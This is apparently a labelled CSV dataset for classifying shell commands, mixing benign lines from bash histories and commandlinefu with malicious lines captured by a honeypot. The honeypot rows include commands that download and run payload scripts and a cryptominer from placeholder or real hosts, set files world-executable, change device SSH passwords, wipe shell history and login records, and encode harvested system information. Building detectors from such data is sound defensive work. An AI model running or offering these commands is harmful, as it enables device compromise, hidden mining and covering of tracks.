id,command,label,source,split
d2_004591,man urxvt,0,bash_history,train
d2_004594,busybox wget http://hdedcf99e.example.net/eBxUk/kjUiwa.sh,1,honeypot,train
d2_004596,./UndefinedBehav,0,bash_history,train
d2_004597,grep -Hrli 'foo' * | xargs vim,0,commandlinefu,train
d2_004598,cat Gemfile.lock,0,bash_history,train
d2_004600,go get -u github.com/typester/gh-open,0,bash_history,train
d2_004601,"complete -C ""perl -e '@w=split(/ /,\$ENV{COMP_LINE},-1);\$w=pop(@w);for(qx(screen -ls)){print qq/\$1\n/ if (/^\s*\$w/&&/(\d+\.\w+)/||/\d+\.(\$w\w*)/)}'"" screen",0,commandlinefu,train
d2_004602,do /bin/busybox echo,1,honeypot,train
d2_004603,mv ips.txt /,0,bash_history,train
d2_004604,mv james-donovan-180375-unsplash.jpg ../,0,bash_history,train
d2_004605,./arm7 self.download,1,honeypot,train
d2_004606,chmod 777 Senpai2.sh,1,honeypot,train
d2_004607,phone,0,bash_history,train
d2_004609,less mame.txt,0,bash_history,train
d2_004611,perl fetch.txt 10.96.139.83,1,honeypot,train
d2_004612,getconf ARG_MAX,0,commandlinefu,train
d2_004613,sudo pacman -Rsu sqlservr,0,bash_history,train
d2_004614,./ZpEVG1a3,1,honeypot,train
d2_004617,chmod 777 f,1,honeypot,train
d2_004618,aumix -v 90,0,commandlinefu,train
d2_004619,sar -u 2 5,0,commandlinefu,train
d2_004620,/bin/busybox rm /tmp/.none,1,honeypot,train
d2_004621,git config --global --add web.browser /opt/firefox/firefox,0,bash_history,train
d2_004622,< /path/to/file.txt grep foo,0,commandlinefu,train
d2_004624,cd .bash,1,honeypot,train
d2_004625,rm -rf mongod.lock,0,bash_history,train
d2_004627,diff <(ssh user@host1 cat /path/to/file) <(ssh user@host2 cat /path/to/file2),0,commandlinefu,train
d2_004630,"complete -W ""$(echo $(grep ^Host ~/.ssh/config | sed -e 's/Host //' | grep -v ""\*""))"" ssh",0,commandlinefu,train
d2_004633,busybox wget http://h8a94b2ee.example.net/bin.sh,1,honeypot,train
d2_004634,wgets.irontec.com/public.key -q -O - | apt-key add -,0,bash_history,train
d2_004635,vi b,0,bash_history,train
d2_004636,LC_ALL=C ~/i8rfvv4dex25jidukzj8b9skgv,1,honeypot,train
d2_004638,ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem*,1,honeypot,train
d2_004640,tftp -r UwUsh -g 145.88.150.109,1,honeypot,train
d2_004641,/bin/busybox cat /proc/timer_list/.nippon,1,honeypot,train
d2_004642,tar xzvf mix.tgz,1,honeypot,train
d2_004643,pwdx 22451,1,honeypot,train
d2_004644,docker rmi 7a6,0,bash_history,train
d2_004645,yaourt camera,0,bash_history,train
d2_004646,./muie,1,honeypot,train
d2_004647,mv docker util,0,bash_history,train
d2_004648,"git commit -a -m ""demo file is modified""",0,bash_history,train
d2_004649,"cat reserved.txt | awk '{count[$0]++}END{for(i in count)print count[i], i}' | sort -n",0,bash_history,train
d2_004651,export PATH=/usr/local/php5/bin:$PATH,0,bash_history,train
d2_004653,sudo vim /etc/postfix/main.cf,0,bash_history,train
d2_004654,arquivotrabalho4 | tr [a-z]teste [A-Z],0,bash_history,train
d2_004656,cat ansible.cfg |grep hosts,0,bash_history,train
d2_004657,git clone git@github.symplified.net:Symplified/xamarin-component.git,0,bash_history,train
d2_004658,wget http://h17a1171a.example.net /bins.sh,1,honeypot,train
d2_004660,lsof -c diff -o -r1 | grep $file,0,commandlinefu,train
d2_004661,tac file.txt,0,commandlinefu,train
d2_004664,./jEmCa5h6,1,honeypot,train
d2_004666,ag ささき Documents/,0,bash_history,train
d2_004667,sudo tlp start,0,bash_history,train
d2_004668,/bin/busybox echo -e '\x47\x72\x6f\x70/proc/timer_list' > /proc/timer_list/.nippon,1,honeypot,train
d2_004669,./trabalho0304.backup,0,bash_history,train
d2_004670,"autossh -o ""ProxyCommand nc --proxy <proxy_hostname_or_ip>:<proxy_port> %h %p"" -M 20000 -f -N <hostname_or_ip> -p 443 -R 2222:localhost:22 -C",0,commandlinefu,train
d2_004671,diff -y <(ssh user@host find /boot|sort) <(find /boot|sort),0,commandlinefu,train
d2_004672,:mksession! <filename>,0,commandlinefu,train
d2_004673,ssh -T git@github.com,0,bash_history,train
d2_004674,host {checkIp or hostname} [dns server],0,commandlinefu,train
d2_004675,mv DSC06410.JPG LeckerLecker.jpg,0,bash_history,train
d2_004676,rostopic echo /chatter /,0,bash_history,train
d2_004678,pintos -v -k -T 60 --bochs --filesys-size=2 -p tests/vm/page-parallel -a page-parallel -p tests/vm/child-linear -a child-linear --swap-size=4 -- -q -f run page-parallel,0,bash_history,train
d2_004679,"ifconfig -a| awk '/^wlan|^eth|^lo/ {;a=$1;FS="":""; nextline=NR+1; next}{ if (NR==nextline) { split($2,b,"" "")}{ if ($2 ~ /[0-9]\./) {print a,b[1]}; FS="" ""}}'",0,commandlinefu,train
d2_004681,"watch grep \""cpu MHz\"" /proc/cpuinfo",0,commandlinefu,train
d2_004682,git log --format='%aN' | sort -u,0,commandlinefu,train
d2_004683,flash set DEF_SSH_PASSWORD 6bD1PUs4dxA3LY,1,honeypot,train
d2_004684,function fcd () { [ -f $1 ] && { cd $(dirname $1); } || { cd $1 ; } pwd },0,commandlinefu,train
d2_004685,LC_ALL=C /home/admin/.dhpcd -o 76.132.177.92:4444 -B >/dev/null 2>/dev/null,1,honeypot,train
d2_004686,sudo tar zxf ./CentOS-5/src/temp/boost_1_53_0.tar.gz,0,bash_history,train
d2_004687,"httpd -V | grep -i SERVER_CONFIG_FILE | cut -f2 -d'""' | xargs grep -i '^DocumentRoot' | cut -f2 -d'""'",0,commandlinefu,train
d2_004689,ram() { for i in /tmp /altroot;do mount -t tmpfs tmpfs $i;done&& for i in /var /root /etc $HOME; do find -d $i |cpio -pdmv /tmp&& mount -t tmpfs tmpfs $i&& mv -v /tmp$i/* $i&& rm -vrf /tmp$i ; done ;} usage: (in rc sequence) ram,0,commandlinefu,train
d2_004692,cp reserved.txt reserved.pl,0,bash_history,train
d2_004693,sudo umount /dev/sda1,0,bash_history,train
d2_004694,Technology java,0,bash_history,train
d2_004695,stop-kafka,0,bash_history,train
d2_004696,unzip rpi_i2c.zip,0,bash_history,train
d2_004698,watch -n1 iptables -vnL,0,commandlinefu,train
d2_004699,for i in `seq 1 4096`; do tr -dc A-Za-z0-9 </dev/urandom | head -c8192 > dummy$i.rnd; done,0,commandlinefu,train
d2_004700,trizen -Ss python2-pip2pkgbuild --noconfirm,0,bash_history,train
d2_004701,mv kp.txt kp1.txt,0,bash_history,train
d2_004704,curl -O http://h8b6b29b9.example.net/Corona.sh,1,honeypot,train
d2_004706,wget https://h8fe31bb0.example.net/r3Tm/xmrig,1,honeypot,train
d2_004707,apt-cache search gem,0,bash_history,train
d2_004708,wgetses/download/v0.13.0/docker-machine-$(uname -s)-$(uname -m),0,bash_history,train
d2_004709,find . -type f -print0 | xargs -0 stat -c'%Y :%y %12s %n' | sort -nr | cut -d: -f2- | head,0,commandlinefu,train
d2_004710,command | sed '/regex/q',0,commandlinefu,train
d2_004711,hg clone -u release,0,bash_history,train
d2_004713,cat /etc/rc.local | gzip | base64,1,honeypot,train
d2_004714,bash -c ./f3igWlCT,1,honeypot,train
d2_004715,od /dev/urandom -w6 -tx1 -An|sed -e 's/ //' -e 's/ /:/g'|head -n 1,0,commandlinefu,train
d2_004717,grep swift.old,0,bash_history,train
d2_004718,gsettings set org.gnome.desktop.background show-desktop-icons true,0,bash_history,train
d2_004719,dirname,0,bash_history,train
d2_004720,"ps aux | awk '{ print $8 "" "" $2 "" "" $11}' | grep -w Z",0,commandlinefu,train
d2_004721,alias s='screen -X screen'; s top; s vi; s man ls;,0,commandlinefu,train
d2_004722,od -An -N1 -tu1 /dev/random,0,commandlinefu,train
d2_004723,./.dropper,1,honeypot,train
d2_004725,rm -rf /dev/shm/ps*,1,honeypot,train
d2_004726,stty sae,0,bash_history,train
d2_004727,"echo ""1"" > /var/tmp/.systemcache436621",1,honeypot,train
d2_004728,cp -r lab1 lab3,0,bash_history,train
d2_004729,vim hello/settings.py,0,bash_history,train
d2_004730,psql -h localhost -U postgres -W,0,bash_history,train
d2_004734,ip route show dev ppp0 | awk '{ print $7 }',0,commandlinefu,train
d2_004735,tail -n +2 foo.txt,0,commandlinefu,train
d2_004737,cat 123|xargs rm,0,bash_history,train
d2_004738,cat /etc/*release | grep PRETTY_NAME,1,honeypot,train
d2_004739,bin/hbase version,0,bash_history,train
d2_004740,sudo nano courses_list.html,0,bash_history,train
d2_004741,"convert -size 20x20 xc:white -fill black -draw ""circle 10,10 14,14"" miff:- | composite -tile - input.png -compose over miff:- | composite - input.png -compose copyopacity output.png",0,commandlinefu,train
d2_004743,tree -L 1 -ChDit | tac,0,commandlinefu,train
d2_004745,sestatus -v,0,commandlinefu,train
d2_004746,vim go,0,bash_history,train
d2_004747,"2. sudo sh -c 'echo ""debs.ros.org/ros/ubuntu trusty main"" > /etc/apt/sources.list.d/ros-latest.list'",0,bash_history,train
d2_004748,wget http://hfa35e192.example.net 9.30.116.128/bins.sh,1,honeypot,train
d2_004749,./test /test.jpg,0,bash_history,train
d2_004750,find -name casa,0,bash_history,train
d2_004751,vagrant ssh ubuntu2,0,bash_history,train
d2_004752,< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c6,0,commandlinefu,train
d2_004753,sudo pacman-mirrors -f0,0,bash_history,train
d2_004754,git --config,0,bash_history,train
d2_004755,"sh -c ""`curl -fsSLs/master/install.sh`""",0,bash_history,train
d2_004756,./dnsd.sh,0,bash_history,train
d2_004757,nbgrader fetch --course data301a,0,bash_history,train
d2_004758,du -csh --time *|sort -n|tail,0,commandlinefu,train
d2_004759,vi grudados,0,bash_history,train
d2_004760,"echo ""hi"" > tmp.txt",0,bash_history,train
d2_004762,./java8000,1,honeypot,train
d2_004763,brew uninstall python,0,bash_history,train
d2_004764,rm -rv vim,0,bash_history,train
d2_004765,brew uninstall --force ruby,0,bash_history,train
d2_004766,smbclient -L TOEKNEESUPERPC -U%,0,bash_history,train
d2_004768,docker container rmi 908965a109d2,0,bash_history,train
d2_004770,ls -a /usr/local/share/emacs/site-lisp,0,bash_history,train
d2_004771,./8qMnl4UV,1,honeypot,train
d2_004772,./QCXkWunf,1,honeypot,train
d2_004773,ls autoload/,0,bash_history,train
d2_004774,ls -ltr AxoProjectTest/trinity_out_dir/chrysalis/,0,bash_history,train
d2_004775,sudo chown mjoe hello.py,0,bash_history,train
d2_004776,touch id_rsa,0,bash_history,train
d2_004777,grep -r . /sys/class/net/eth0/statistics,0,commandlinefu,train
d2_004778,cat client.cnf,0,bash_history,train
d2_004779,mv 00_7_Ahead_4-28_then_00_8_Overview_edit2.mp4 00_8_Overview.mp4,0,bash_history,train
d2_004780,cat .emacs.d/,0,bash_history,train
d2_004781,perl WF 39.109.242.249,1,honeypot,train
d2_004782,curl -O http://h9058966c.example.net/UwUsh,1,honeypot,train
d2_004783,echo ${PIPESTATUS[@]},0,commandlinefu,train
d2_004784,v /tmp/tmp_data/BINARY_FOR_BREDICTION_HEADING_SMOOTHING/,0,bash_history,train
d2_004785,"echo ""informe usuario:""; read user;",0,bash_history,train
d2_004786,/usr/sbin/arp -an | gzip | base64,1,honeypot,train
d2_004788,pip install lxml,0,bash_history,train
d2_004792,/. teste,0,bash_history,train
d2_004793,hotp,0,bash_history,train
d2_004794,ubuntu-bug,0,commandlinefu,train
d2_004795,echo 'b'zeroshell'' | sudo -S rm /var/uKzOCllMkq,1,honeypot,train
d2_004796,du -aB1m|awk '$1 >= 100',0,commandlinefu,train
d2_004798,"lsmod | perl -e 'print ""digraph \""lsmod\"" {"";<>;while(<>){@_=split/\s+/; print ""\""$_[0]\"" -> \""$_\""\n"" for split/,/,$_[3]}print ""}""' | dot -Tpng | display -",0,commandlinefu,train
d2_004799,wget --mirror -p --convert-links -P ./<LOCAL-DIR> <WEBSITE-URL>,0,commandlinefu,train
d2_004800,rm -rf womp,0,bash_history,train
d2_004801,mcedit williamMCEDIT,0,bash_history,train
d2_004802,dd if=/path/to/inputfile of=/path/to/outputfile & pid=$! && sleep X && while kill -USR1 $pid; do sleep X; done,0,commandlinefu,train
d2_004803,git push ca_project,0,bash_history,train
d2_004805,"find . -name ""*.py[co]"" -exec rm -f {} \;",0,commandlinefu,train
d2_004806,cat filename | grep .,0,commandlinefu,train
d2_004807,vi Servo_Example.py,0,bash_history,train
d2_004808,cd .sss,1,honeypot,train
d2_004809,perl ug*,1,honeypot,train
d2_004810,ps -faux | gzip | base64,1,honeypot,train
d2_004813,ntpq -p -4,0,bash_history,train
d2_004814,chmod +x ./usb_ver,1,honeypot,train
d2_004815,"ldapsearch -v -H ldap://<server> -x -D cn=<johndoe>,cn=<users>,dc=<ourdomain>,dc=<tld> -w<secret> -b ou=<lazystaff>,dc=<ourdomain>,dc=<tld> -s sub sAMAccountName=* '*' | perl -pne 's/(\d{11})\d{7}/""DATE-AD("".scalar(localtime($1-11644473600))."")""/e'",0,commandlinefu,train
d2_004816,rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh,1,honeypot,train
d2_004817,openssl req -config openssl.cnf -key private/ca.key.pem -new -x509 -days 7300 -sha256 -extensions v3_ca -out certs/ca.cert.pem,0,bash_history,train
d2_004818,rm data nome pwd,0,bash_history,train
d2_004820,"mysql -umysqlusername -pmysqlpass databsename -B -e ""select * from \`tabalename\`;"" | sed 's/\t/"",""/g;s/^/""/;s/$/""/;s/\n//g' > mysql_exported_table.csv",0,commandlinefu,train
d2_004821,convert -colorspace gray face.jpg gray_face.jpg,0,commandlinefu,train
d2_004822,rm -rf ~/.oh-my-zsh/,0,bash_history,train
d2_004824,terraform plan a2.tf,0,bash_history,train
d2_004825,vim setup,0,bash_history,train
d2_004826,perl bot.pl,1,honeypot,train
d2_004827,touch /uKzOCllMkq,1,honeypot,train
d2_004829,vim ... :nmap <F5> :w^M:!python %<CR>,0,commandlinefu,train
d2_004831,"export-opml(){ curl -sH ""Authorization: GoogleLogin auth=$(curl -sd ""Email=$1&Passwd=$2&service=reader"" https://hd8b99f68.example.net/accounts/ClientLogin | grep Auth | sed 's/Auth=\(.*\)/\1/')"" http://hd8b99f68.example.net/reader/subscriptions/export; }",0,commandlinefu,train
d2_004832,mvim /sandbox/sites/,0,bash_history,train
d2_004833,mv lib/info_pc1_cesar.c lib/printInfo.c,0,bash_history,train
d2_004834,git add Makefile assn3.c,0,bash_history,train
d2_004835,cd /sys/,1,honeypot,train
d2_004836,mail -A /var/www/html/alertas/reportes/repexcel.xls ricardo.buitrago@solutionscluster.net,0,bash_history,train
d2_004840,wget -qstgresql.org/media/keys/ACCC4CF8.asc -O - | sudo apt-key add -,0,bash_history,train
d2_004841,mdk ps es-data-speed,0,bash_history,train
d2_004842,ating gzip-compressed initcpio image: /boot/initramfs-linux.img,0,bash_history,train
d2_004843,dpkg -l python,0,commandlinefu,train
d2_004844,tar -xzvf sca,1,honeypot,train
d2_004845,less utils/__init__.py,0,bash_history,train
d2_004846,comando],0,bash_history,train
d2_004847,ls -ltr /data,0,bash_history,train
d2_004849,sudo mkdir /var/cache/polipo,0,bash_history,train
d2_004850,git %USERPROFILE%/.gitconfig,0,bash_history,train
d2_004852,git merge backup,0,bash_history,train
d2_004853,netstat -nptl,0,commandlinefu,train
d2_004855,chmod 777 arm7,1,honeypot,train
d2_004856,python3 -m pip install discord.py,0,bash_history,train
d2_004857,rm -rf awoo.sh awoo.sh awoo2.sh awoo1.sh,1,honeypot,train
d2_004858,rm -f what-time-script.sh,0,bash_history,train
d2_004859,ssh -p 2222root@rodineibadin.zapto.org,0,bash_history,train
d2_004860,"grep 'cpu' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage ""%""}'",0,bash_history,train
d2_004861,sh hac.sh,1,honeypot,train
d2_004862,find . -mmin -30|xargs grep auto.el,0,bash_history,train
d2_004864,"ruby -ropen-uri -e 'require ""hpricot"";(Hpricot(open(""http://h58d5d3de.example.net""))/"".command"").each{|c| puts c.to_plain_text}'",0,commandlinefu,train
d2_004865,ll Pictures/,0,bash_history,train
d2_004867,nohup ping -i1 www.google.com &,0,commandlinefu,train
d2_004870,"find . -name ""*.txt"" -exec WHATEVER_COMMAND {} \;",0,commandlinefu,train
d2_004871,python filter_reporter.py,0,bash_history,train
d2_004874,"for f in *.html; do sed '$d' -i ""$f""; done",0,commandlinefu,train
d2_004875,arp,0,bash_history,train
d2_004876,echo '<foo><bar/></foo>' | xmllint --format -,0,commandlinefu,train
d2_004877,./JNiarWbk,1,honeypot,train
d2_004878,libinput --help,0,bash_history,train
d2_004879,toor,1,honeypot,train
d2_004880,bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic test --from-beginning,0,bash_history,train
d2_004881,"radio.setRetries(15,15)",0,bash_history,train
d2_004882,nbgrader fetch day03,0,bash_history,train
d2_004883,nano /etc/sudoers,0,bash_history,train
d2_004884,nano /etc/xorg.conf,0,bash_history,train
d2_004885,git add app/modular/sass/base/global-briq.scss,0,bash_history,train
d2_004886,"echo ""export DISPLAY=:0; export XAUTHORITY=~/.Xauthority; notify-send test"" | at now+1minute",0,commandlinefu,train
d2_004887,cat /home/sahudeepak154/.npm/_logs/2019-06-13T06_52_34_069Z-debug.log,0,bash_history,train
d2_004888,php yii socket/start-socket 1037,0,bash_history,train
d2_004889,history -c.,1,honeypot,train
d2_004891,cd smtpd,1,honeypot,train
d2_004892,flash set DEF_SSH_PASSWORD ZVHVdnRJfVNOshPBm,1,honeypot,train
d2_004893,cat arquivotrabalho4 | tr a-z A-Z,0,bash_history,train
d2_004894,sudo dotlockfile -r /etc/.pwd.lock,0,bash_history,train
d2_004895,wget fanelishere.ro/xmrig,1,honeypot,train
d2_004896,git checkout admin,0,bash_history,train
d2_004897,"git commit .Xresources -m""Fixed fonts""",0,bash_history,train
d2_004898,for i in `cat /proc/net/ip_tables_names`; do iptables -nL -v --line-numbers -t $i ; done,0,commandlinefu,train
d2_004899,vd playbooks/,0,bash_history,train
d2_004900,chmod 777 iotmp/,0,bash_history,train
d2_004901,nohup /tmp/cong > /dev/null 2>&1 &,1,honeypot,train
d2_004902,lww,1,honeypot,train
d2_004903,overcloud-objectstorage-0: lab-swift01,0,bash_history,train
d2_004904,find / -xdev -printf '%h\n' | sort | uniq -c | sort -k 1 -n | tail,0,commandlinefu,train
d2_004905,sudo dpkg update locale,0,bash_history,train
d2_004907,more *.diff,0,bash_history,train
d2_004908,ssh -NR 7.98.246.159:2222:76.132.177.92:22 user@jump.host.com,0,commandlinefu,train
d2_004910,grep -e `date +%Y-%m-%d` /var/log/dpkg.log | awk '/install / {print $4}' | uniq | xargs apt-get -y remove,0,commandlinefu,train
d2_004911,history -s command,0,commandlinefu,train
d2_004912,yum install untar,0,bash_history,train
d2_004913,rosc,0,bash_history,train
d2_004914,wget NasaPaul.com.com/paul,1,honeypot,train
d2_004915,"find . -name ""*.sh"" |xargs grep -i wifiext",0,bash_history,train
d2_004916,rm -rf /var/run/utmp,1,honeypot,train
d2_004917,du -sk ./* | sort -nr,0,commandlinefu,train
d2_004920,cd /etc/passwd,1,honeypot,train
d2_004921,ls -l | egrep ^d,0,commandlinefu,train
d2_004922,"bm() { export BM${1?""bookmark name missing""}=""$PWD"" ; }; forget() { unset BM${1?""bookmark name missing""} ; }",0,commandlinefu,train
d2_004923,cat 1.dict,0,bash_history,train
d2_004924,tar xf yay.tgz,1,honeypot,train
d2_004925,hp getNotice.cd ../,0,bash_history,train
d2_004927,lcd build/,0,bash_history,train
d2_004930,rm -r All/,0,bash_history,train
d2_004931,"find . -name '*docx' -exec sh -c ""unzip -p {} word/document.xml | sed -e 's/<[^>]\{1,\}>//g; s/[^[:print:]]\{1,\}//g' | grep -i SearchTerm -q && echo {} "" \;",0,commandlinefu,train
d2_004932,srandom() { zmodload zsh/system; local byte; local -i rnd=0; repeat 4; do sysread -s 1 byte || return; rnd=$(( rnd << 8 | #byte )); done < /dev/urandom; print -r -- $rnd; },0,commandlinefu,train
d2_004933,/bin/busybox wget http://hc4205358.example.net/bins.sh,1,honeypot,train
d2_004934,curl -O http://h17a1171a.example.net/sh,1,honeypot,train
d2_004935,ssh-copy-id root@158.69.94.137,0,bash_history,train
d2_004936,"sudo qemu-system-x86_64 -bios /usr/share/ovmf/x64/OVMF.fd -accel kvm -boot d -cdrom ubuntu-21.10-desktop-amd64.iso -drive format=raw,file=/dev/sdb -m 4096",0,commandlinefu,train
d2_004937,>/etc/.file,1,honeypot,train
d2_004939,tar xf packet_tracer_7.2.1_for_linux_64_bit.tar.gz,0,bash_history,train
d2_004940,alias cd1='cd $( ls -lt | grep ^d | head -1 | cut -b 51- )',0,commandlinefu,train
d2_004941,"alias clearscrollback='clear;printf %b ""\033[3J""'",0,commandlinefu,train
d2_004943,"LC_ALL=C HISTFILE="""" TERM=xterm $SHELL -i",1,honeypot,train
d2_004944,echo 44Xm5iT7ceCMa78zbzxBR6LQR32JXPmWnJ5zr13RHoP5E97Ukbhv2cJBarphZSjbsF9SfAxwVT1ykLSgf4ADHfdPEat1ny1 > adresa,1,honeypot,train
d2_004946,gpg --list-sigs | sed -rn '/User ID not found/s/^sig.+([a-FA-F0-9]{8}).*/\1/p' | xargs -i_ gpg --keyserver-options no-auto-key-retrieve --recv-keys _,0,commandlinefu,train
d2_004947,sudo pacman -R handbrake,0,bash_history,train
d2_004948,rm home.css,0,bash_history,train
d2_004949,sh Corona4.sh,1,honeypot,train
d2_004951,find /var/www/ -name file -exec cp {} {}.bak \;,0,commandlinefu,train
d2_004952,"cat /proc/cpuinfo | grep proc | wc -l) | tr -d ""\n""",1,honeypot,train
d2_004953,"for i in `netstat -rn|egrep -v ""Interface|Routing""|awk '{print $5}'`;do ifconfig $i;done",0,commandlinefu,train
d2_004954,ls -lh $(which ls),1,honeypot,train
d2_004955,mkdir docker-test,0,bash_history,train
d2_004956,wget http://h3bc4a356.example.net/mineryess.tgz,1,honeypot,train
d2_004957,for i in $(cat listofservers.txt); do konsole --new-tab -e ssh $i; done,0,commandlinefu,train
d2_004960,ls playlists/,0,bash_history,train
d2_004961,tftp militarynetwork.theworkpc.com -c get zatoempire.sh,1,honeypot,train
d2_004962,wget http://h2cb401cd.example.net/ys808e,1,honeypot,train
d2_004964,"sed -i 's|\(""browser.startup.homepage"",\) ""\(.*\)""|\1 ""http://h644a8223.example.net""|' .mozilla/firefox/*.default/prefs.js",0,commandlinefu,train
d2_004965,./login.sh,0,bash_history,train
d2_004966,wget http://h8fc41370.example.net/sh,1,honeypot,train
d2_004967,"head -4 /etc/passwd | tr : , | sed -e 's/^/| /' -e 's/,/,| /g' -e 's/$/,|/' | column -t -s,",0,commandlinefu,train
d2_004968,./SRu3SHBb,1,honeypot,train
d2_004969,mplayer -vo dummy -ao dummy -identify your_video.avi,0,commandlinefu,train
d2_004970,git add week00,0,bash_history,train
d2_004971,cat deluged.log,0,bash_history,train
d2_004972,eject /dev/sdb; sleep 1; eject -t /dev/sdb,0,commandlinefu,train
d2_004973,ftpget -v -u anonymous -p anonymous -P 21 223.220.249.159 kjUiwa2.sh kjUiwa2.sh,1,honeypot,train
d2_004974,rm -rf .history,1,honeypot,train
d2_004975,./p11,0,bash_history,train
d2_004976,"test $n1 -lt $n2 && echo ""MENOR""",0,bash_history,train
d2_004977,./checks.sh,0,bash_history,train
d2_004978,curl -O http://h69065841.example.net/as12a0s/z2s234.x86,1,honeypot,train
d2_004980,docker stop $(docker ps -a -q); docker rm $(docker ps -a -q),0,commandlinefu,train
d2_004981,./leanote,0,bash_history,train
d2_004982,mplayer -shuffle *,0,commandlinefu,train
d2_004983,g++ StringRotate.cpp,0,bash_history,train
d2_004984,nc -zvw 1 host port,0,commandlinefu,train
d2_004985,cat 130524_SN1057_0126_BD1EWUACXX/Peng_Run_CASAVA.sh,0,bash_history,train
d2_004986,phantomjs tmp.js,0,bash_history,train
d2_004987,chmod +x mi3307,1,honeypot,train
d2_004988,scp Downloads/イベレコ_logo.png -i zdogma.pem ec2-user@ec2-54-201-249-53.us-west-2.compute.amazonaws.com,0,bash_history,train
d2_004991,rm ecollectionz.conf,0,bash_history,train
d2_004992,sed -i '1s/^/text to prepend\n/' file1,0,commandlinefu,train
d2_004993,"git diff $(git log --pretty=format:%h -2 --reverse | tr ""\n"" "" "")",0,commandlinefu,train
d2_004994,"init=/bin/bash; mount -o remount,rw /",0,commandlinefu,train
d2_004995,echo sortmeplease | grep -o . | sort | tr -d '\n'; echo,0,commandlinefu,train
d2_004997,curl -O http://hb780b7d8.example.net/isu80,1,honeypot,train
d2_004998,ls ~/.cpan/build/,0,bash_history,train
d2_004999,"finit ""1 2 3"" 3 2 1 | while fnext i ; do echo $i; done;",0,commandlinefu,train
d2_005000,python3 -m venv mine,0,bash_history,train
d2_005001,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ bash: hhneuauf.de]$: command not found,0,bash_history,train
d2_005002,perl info,1,honeypot,train
d2_005003,unlink global_conf.json,0,bash_history,train
d2_005004,mv ips.txt.1 ips.txt,0,bash_history,train
d2_005005,"tr -d ""\r"" < dos.txt > linux.txt",0,commandlinefu,train
d2_005006,cut -d /etc/passwd,0,bash_history,train
d2_005007,lshw -C display,1,honeypot,train
d2_005008,cd /usr/sharee/tomcat/,0,bash_history,train
d2_005009,sudo apt-get install python3-setuptools python3-dev --assume-yes,0,bash_history,train
d2_005010,"convert -rotate $rotate -scale $Widthx$Height -modulate $brightness -contrast $contrast -colorize $red%,$green%,$blue% $filter file_in.png file_out.png",0,commandlinefu,train
d2_005011,curl -s 'http://hc7c90b63.example.net' | sed 's/.*Current IP Address: \([0-9\.]*\).*/\1/g',0,commandlinefu,train
d2_005012,"grep -r ""console"" ./os161/",0,bash_history,train
d2_005013,/bin/busybox cat /proc/timer_list/.none,1,honeypot,train
d2_005014,perl -MCPAN -e 'CPAN::Shell->install(CPAN::Shell->r)',0,commandlinefu,train
d2_005015,/bin/busybox echo -e '\x50\x6f\x72\x74/etc/hostname' > /etc/hostname/.none,1,honeypot,train
d2_005016,apt install libapache2-mod-php,0,bash_history,train
d2_005017,ssh $HOST -l$USER cat /REMOTE/FILE | sdiff /LOCAL/FILE -,0,commandlinefu,train
d2_005018,javac hau.java,0,bash_history,train
d2_005019,"find . -maxdepth 1 -mindepth 1 -type d -printf ""%f\n""",0,commandlinefu,train
d2_005020,wget http://h095a0dc7.example.net/server.tar.gz,1,honeypot,train
d2_005021,alias please='sudo $(fc -ln -1)',0,commandlinefu,train
d2_005022,vim CMakeLists.txt,0,bash_history,train
d2_005023,mv miner .ICE-chm,1,honeypot,train
d2_005024,wget http://h5b59e41c.example.net/do3309,1,honeypot,train
d2_005025,/bin/busybox chmod 777 .t,1,honeypot,train
d2_005026,history |grep pyt,0,bash_history,train
d2_005027,/root,1,honeypot,train
d2_005029,cp ~/b6040202998/lap7 ~/b6040200634/,0,bash_history,train
d2_005030,"cls(){ printf ""\033c"";} or, if no printf, cat > c ;<ctrl+v> <ctrl+[>c <enter><ctrl-d> c(){ cat c;} #usage: c",0,commandlinefu,train
d2_005031,mencoder -sub subs.ssa -utf8 -subfont-text-scale 4 -oac mp3lame -lameopts cbr=128 -ovc lavc -lavcopts vcodec=mpeg4 -ffourcc xvid -o output.avi input.flv,0,commandlinefu,train
d2_005032,ls ../adult_FAIL/,0,bash_history,train
d2_005034,rm -fr perl-5.10.0/,0,bash_history,train
d2_005035,./4Ps6NJEh,1,honeypot,train
d2_005036,rm -f /proc/.nippon,1,honeypot,train
